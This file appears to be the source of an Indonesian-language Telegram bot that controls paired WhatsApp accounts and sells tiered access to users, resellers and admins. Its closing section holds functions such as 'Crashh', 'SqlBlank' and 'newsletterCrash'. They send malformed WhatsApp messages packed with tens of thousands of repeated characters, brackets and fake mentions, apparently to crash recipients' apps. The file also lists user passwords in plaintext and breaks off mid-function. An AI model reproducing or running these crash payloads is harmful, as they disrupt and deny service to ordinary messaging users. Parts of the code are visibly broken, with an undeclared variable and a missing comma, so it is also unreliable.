const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";
const { getUsers, saveUsers } = require("./database/userStore.js");

let userApiBug = null;

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require("cookie-parser");
app.use(cookieParser());
const userPath = path.join(__dirname, "./database/user.json");


const USAGE_LIMIT_FILE = "./database/usageLimit.json";

function getUsageLimit() {
  try {
    if (fs.existsSync(USAGE_LIMIT_FILE)) {
      return JSON.parse(fs.readFileSync(USAGE_LIMIT_FILE, "utf-8"));
    } else {
      return {};
    }
  } catch (e) {
    return {};
  }
}

function saveUsageLimit(data) {
  fs.writeFileSync(USAGE_LIMIT_FILE, JSON.stringify(data, null, 2));
}

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  const allOwners = [config.owner, ...data.owners.map(x => x.toString())];
  return allOwners.includes(id.toString());
}

function isAdmin(userId) {
  const users = getUsers();
  const user = users.find(u => u.telegram_id === userId);
  return user && (user.role === "admin" || user.role === "owner");
}

function isReseller(userId) {
  const users = getUsers();
  const user = users.find(u => u.telegram_id === userId);
  return user && (user.role === "reseller" || user.role === "owner");
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
  
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  WAProto,
  proto,
  BaileysError,
} = require('@whiskeysockets/baileys');

let Xaa;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    Ataa = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      Ataa.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, Ataa);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      Ataa.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  Ataa = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  Ataa.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, Ataa);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
  await new Promise(r => setTimeout(r, 1000));
  try {
    if (!fs.existsSync(`${sessionDir}/creds.json`)) {
      const code = await Ataa.requestPairingCode(BotNumber, "OVERLOAD");

      const codeData = makeCode(BotNumber, code);
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
        parse_mode: "Markdown",
        reply_markup: codeData.reply_markup
      });
    }
  } catch (err) {
    console.error("Error requesting code:", err);
    await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
  }
}

  Ataa.ev.on("creds.update", saveCreds);
  return Ataa;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});
console.clear();
console.log(chalk.magenta(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡿⠿⢿⣷⣶⣤⡀⢀⣤⣶⣾⣿⠿⠿⣿⣷⣶⣶⣤⣄⣀⡀
⠉⠁⢀⣾⣿⣭⣍⡛⠻⠟⠋⠉⠙⠻⠿⠛⠛⠉⠉⠙⠻⠿⠋
⢀⣾⡿⠋⠁⠀⠈⠙⠛⠶⣶⣤⣄⡀⠀⠀⠀⠀⢀⣠⡾⠃⠀
⠸⣿⣧⣀⣤⣴⣶⣶⣶⣦⣤⣈⣉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀
⠀⠈⠻⢿⣿⣿⡿⠿⠿⠿⠿⠿⠟⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀
⠀⠈⠙⠛⠛⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡤⠤⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣤⣤⣀
⣶⣿⣯⣭⣽⣿⣿⣿⣷⣶⣤⣄⡀⢀⣤⣾⣿⣿⣿⣯⣭⣿⣿
⠘⠿⠿⠛⠉⠉⠉⠛⠛⠿⣿⣿⣿⠿⠛⠋⠉⠉⠉⠉⠉⠙⠋
𝔇𝔢𝔰𝔱𝔯𝔬𝔶 𝔱𝔥𝔢 𝔫𝔬𝔯𝔪. 𝔅𝔢𝔠𝔬𝔪𝔢 𝔲𝔫𝔯𝔢𝔞𝔩.⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╔══════════════════════════════════════╗
║   ${chalk.bgBlackBright.bold(' X7i - System Aktif  ')}.  ║
╠══════════════════════════════════════╣
║   ${chalk.cyanBright('ID OWNER')}   : ${chalk.yellowBright(OwnerId)}        
║   ${chalk.magentaBright('STATUS')}     : ${chalk.greenBright('BOT CONNECTED ✅')} 
╚══════════════════════════════════════╝
`))
initializeWhatsAppConnections();

function owner(userId) {
  return config.owner.includes(userId.toString());
}

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
bot.start((ctx) => {
  const name = ctx.from.first_name || "User";

  const message = `
👾 *Welcome to X7i Settings!*

🛡️ SYSTEM COMMAND ACCESS 🛡️

/adduser   → Create User  
/address   → Create Reseller  
/addadmin  → Create Admin  
/addowner  → Create Owner  
/edituser  → Change User  
/extend    → Extend Expired  
/listuser  → Reveal All Active Users  
/deluser   → Remove User  
/connect   → Bind Your Bot Session  
/listsender → Trace Active Sender  
/delsender  → Purge Sender Identity

_You are now inside the grid.  
Power is yours to command._
`;

  ctx.replyWithMarkdown(message, {
    disable_web_page_preview: true,
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Contact Admin", url: "https://t.me/WhyBro666" }
        ]
      ]
    }
  });
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);

  }
});


bot.command("adduser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menambah user.");
  }

  if (args.length !== 4) {
    return ctx.reply("Format: /adduser username password durasi");
  }

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply("❌ Username sudah terdaftar.");
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "user" });
  saveUsers(users);
  
  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ User berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deluser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menghapus user.");
  }

  if (args.length !== 2) {
    return ctx.reply("Format: /deluser username");
  }

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply("❌ Username tidak ditemukan.");
  if (users[index].role === "admin" && !isAdmin(userId)) {
    return ctx.reply("❌ Reseller tidak bisa menghapus user Admin.");
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ User *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menambahkan OWNER.");
  if (args.length !== 4) return ctx.reply("Format: /addowner Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "owner" });
  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ Owner berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menghapus OWNER.");
  if (args.length !== 2) return ctx.reply("Format: /delowner username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username && u.role === "owner");

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan atau bukan owner.`, { parse_mode: "Markdown" });
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ Owner *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("address", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ Hanya Admin yang bisa menambahkan Reseller.");
  if (args.length !== 4) return ctx.reply("Format: /address Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "reseller" });
  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ Reseller berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delress", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ Hanya Admin yang bisa menghapus Reseller.");
  if (args.length !== 2) return ctx.reply("Format: /delress username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  if (users[index].role !== "reseller") return ctx.reply(`⚠️ *${username}* bukan reseller.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ Reseller *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addadmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menambahkan Admin.");
  }

  if (args.length !== 4) {
    return ctx.reply("Format: /addadmin Username Password Durasi");
  }

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({
    username,
    password,
    expired,
    role: "admin",
    telegram_id: userId
  });

  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``;

  return ctx.reply(
    `✅ Admin berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deladmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menghapus Admin.");
  }

  if (args.length !== 2) {
    return ctx.reply("Format: /deladmin <username>");
  }

  const username = args[1];
  let users = getUsers();
  const target = users.find(u => u.username === username && u.role === "admin");

  if (!target) {
    return ctx.reply(`❌ Admin *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  users = users.filter(u => u.username !== username);
  saveUsers(users);

  return ctx.reply(`🗑️ Admin *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("listuser", (ctx) => {
  const userId = ctx.from.id;
  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Reseller/Admin yang bisa menggunakan perintah ini.");
  }

  const users = getUsers();
  const isOwnerUser = isOwner(userId);

  let text = `📋 Daftar Pengguna:\n\n`;
  users.forEach((user) => {
    if (!isOwnerUser && user.role === "admin") return; // Admin tidak boleh lihat owner
    text += `👤 *${user.username}*\n🔑 ${user.password}\n📅 Exp: ${new Date(user.expired).toLocaleString("id-ID")}\n🎖️ Role: ${user.role}\n\n`;
  });

  return ctx.reply(text.trim(), { parse_mode: "Markdown" });
});

bot.command("edituser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Reseller/Admin yang bisa mengedit user.");
  }

  if (args.length < 5) {
    return ctx.reply("Format: /edituser Username Password Durasi Role");
  }

  const [_, username, password, durasi, role] = args;
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  if (!["user", "reseller", "admin", "owner"].includes(role)) {
    return ctx.reply(`⚠️ Role hanya bisa: User, Reseller, Admin.`, { parse_mode: "Markdown" });
  }

  if (role === "admin" && !isAdmin(userId)) {
    return ctx.reply("❌ Kamu bukan owner, tidak bisa membuat user role owner.");
  }

  users[index] = {
    ...users[index],
    password,
    expired: Date.now() + parseInt(durasi) * 86400000,
    role
  };

  saveUsers(users);
  return ctx.reply(`✅ User *${username}* berhasil diperbarui.`, { parse_mode: "Markdown" });
});

bot.command("extend", (ctx) => {
  const userId = ctx.from.id;
  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Reseller/Admin yang bisa memperpanjang masa aktif.");
  }

  const args = ctx.message.text.split(" ");
  if (args.length !== 3) return ctx.reply("Format: /extend Username Durasi");

  const [_, username, durasi] = args;
  const days = parseInt(durasi);
  if (isNaN(days) || days <= 0) return ctx.reply("❌ Durasi harus berupa angka lebih dari 0.");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply("❌ Username tidak ditemukan.");
  if (users[index].role === "admin") return ctx.reply("⛔ Tidak bisa memperpanjang masa aktif untuk user role admin.");

  const now = Date.now();
  const base = users[index].expired > now ? users[index].expired : now;
  users[index].expired = base + (days * 86400000);

  saveUsers(users);
  ctx.reply(`✅ Masa aktif *${username}* berhasil diperpanjang hingga ${new Date(users[index].expired).toLocaleString("id-ID")}`, { parse_mode: "Markdown" });
});

// -------------------( ANDRO FUNC )------------------------------

async function SqlBlank(target) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "123456789@newsletter",
            newsletterName: "You Know Faridz?" + 
            "ꦽ".repeat(500) + 
            "ꦾ".repeat(60000),
            jpegThumbnail: "https://files.catbox.moe/qbdvlw.jpg",
            caption: "" + "ꦾ".repeat(60000),
            inviteExpiration: Date.now() + 9999999999,
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000),
      },
      contextInfo: {
        remoteJid: target,
        participant: target,
        stanzaId: Ataa.generateMessageTag(),
      },
    };

    await Ataa.relayMessage(target, message, {
      userJid: target,
    });
  } catch (error) {
    console.log("error:\n" + error);
  }
}

async function Crashh(target) {
  try {
    let cards = [];

    for (let i = 0; i < 1000; i++) {
      cards.push({
        header: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
            fileLength: "9999999999",
            height: 816,
            width: 654,
            mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
            fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
            directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1749220174",
            jpegThumbnail: " XXX "
          },
          hasMediaAttachment: true
        },
        body: {
          text: "ꦽ".repeat(30000)
        },
        nativeFlowMessage: {
          messageParamsJson: "{}"
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(999999999999999)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
            {
              name: "payment_method",
              buttonParamsJson: "{}",
            },
            {
              name: "payment_info",
              buttonParamsJson: "{}"
            },
            {
              name: "payment_settings",
              buttonParamsJson: "{}"
            },
            {
              name: "review_and_pay",
              buttonParamsJson: "{}"          
            },
          ]
        }
      });
    }

    const message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [ target, ...Array.from({ length: 35000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target
              },
              participant: target,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "Sent",
                        format: "DEFAULT"
                      },
                      nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: "\n".repeat(10000),
                        version: 3
                      }
                    }
                  }
                }
              }
            },
            body: {
              text: "ꦽ".repeat(30000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(50000)
            },
            carouselMessage: {
              cards: cards
            }
          }
        }
      }
    };

    await Ataa.relayMessage(target, message, {
      messageId: undefined,
      participant: { jid: target }
    });
  } catch (err) {
    console.log(err);
  }
}

async function newsletterCrash(target) {
  var msg = generateWAMessageFromContent(target, {
    lottieStickerMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.15575-24/28891099_1968560060663009_4361029479081828586_n.enc?ccb=11-4&oh=01_Q5Aa2gHQFJPLsT-rSl2WVOe20Vh7NUQQZRmEs2_1ARxgFlWzbw&oe=68EA4671&_nc_sid=5e03e0&mms3=true",
          fileSha256: "fgQWpTTz3w6EqjE/tUwlNae3e7Xkf+9Fl+YC4cKn4NY=",
          fileEncSha256: "ikhGznm9q/z3w0D7vyuaj1qmI0w7p8gG1+sO/aYdeLU=",
          mediaKey: "HtsLpZ6/C980v8D9GpCMbaOR2JslbK2SnxFJJlqg+dE=",
          mimetype: "application/was",
          height: 512,
          width: 512,
          directPath: "/v/t62.15575-24/28891099_1968560060663009_4361029479081828586_n.enc?ccb=11-4&oh=01_Q5Aa2gHQFJPLsT-rSl2WVOe20Vh7NUQQZRmEs2_1ARxgFlWzbw&oe=68EA4671&_nc_sid=5e03e0",
          fileLength: 13862,
          pngThumbnail: ZeppImg, 
          mediaKeyTimestamp: 1757601173,
          isAnimated: true,
          stickerSentTs: 1757602462702,
          isAvatar: false,
          isAiSticker: false,
          isLottie: true, 
          annotations: [
            {
              polygonVertices: [
                {
                  x: 25022008, 
                  y: -25022008
                }
              ], 
              newsletter: {
                newsletterJid: target, 
                newsletterName: "D | 7eppeli-Exploration", 
                serverMessageId: 999,
                contentType: "UPDATE", 
                accessibilityText: "¿?"
              }
            }
          ], 
          messageContextInfo: {
            supportPayload: JSON.stringify({
              is_ai_message: false, 
              ticket_id: crypto.randomBytes(28)
            }), 
            messageAssociation: {
              associationType: 11,
              parentMessageKey: 2,
              messageIndex: 1
            }
          }, 
          contextInfo: {
            statusAttributionType: 2,
            isForwarded: true, 
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "13135550202@newsletter", 
              newsletterName: "Business Assistant", 
              ServerMessageId: 9999
            }, 
            externalAdReply: {
              body: "", 
              mediaType: 1,
              thumbnail: ZeppImg, 
              thumbnailUrl: "https://Wa.me/stickerpack/7eppeli", 
              sourceUrl: "https://Wa.me/stickerpack/7eppeli",
              renderLargerThumbnail: true, 
              showAdAttribution: true
            }, 
            dissepearingMode: {
              initiator: "INITIATED_BY_ME", 
              trigger: "ACCOUNT_SETTING"
            }, 
            expiration: Date.now() - 1000,
            ephemeralSettingTimestamp: -9999
          }
        }
      }
    }
  }, { userJid:target });
  
  await Ataa.sendMessage(target, {
    forward: msg, 
    force: true
  })
}

async function MediaInvis(target) {
  try {
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
